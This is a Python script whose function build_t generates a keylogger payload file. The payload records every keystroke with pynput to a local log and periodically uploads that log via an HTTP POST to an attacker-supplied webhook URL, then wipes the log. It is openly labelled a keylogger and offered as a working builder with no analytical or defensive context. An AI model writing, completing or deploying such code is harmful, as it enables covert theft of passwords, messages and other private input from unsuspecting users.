import os

def build_t(token: str, interval: str, output_file: str = "Key.py") -> None:
    """
    Generates a simple keylogger payload script with the provided token and interval.

    Args:
        token (str): The webhook or API token to send logs to.
        interval (str): Time interval between log sends (in minutes).
        output_file (str): The name of the output payload file.
    """
    # Validate inputs
    if not token.startswith('http'):
        raise ValueError("Invalid token: Expected a valid URL or API endpoint.")
    
    if not interval.isdigit() or int(interval) <= 0:
        raise ValueError("Invalid interval: Must be a positive integer.")

    payload_code = f"""
import time
import requests
import logging
from pynput import keyboard

TOKEN = "{token}"
INTERVAL = {int(interval)} * 60  # Convert minutes to seconds
LOG_FILE = "keylogs.txt"

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def send_logs():
    with open(LOG_FILE, 'rb') as f:
        files = {{'file': f}}
        response = requests.post(TOKEN, files=files)
        if response.status_code == 200:
            open(LOG_FILE, 'w').close()  # Clear the log file after sending
        else:
            logging.error("Failed to send logs. Status Code: {{}}".format(response.status_code))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while True:
            time.sleep(INTERVAL)
            send_logs()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
    except Exception as e:
        logging.error("An unexpected error occurred: {{}}".format(e))
    """

    try:
        with open(output_file, "w") as f:
            f.write(payload_code)
        print(f"Payload '{output_file}' successfully generated.")
    except IOError as e:
        print(f"Failed to write payload file: {e}")
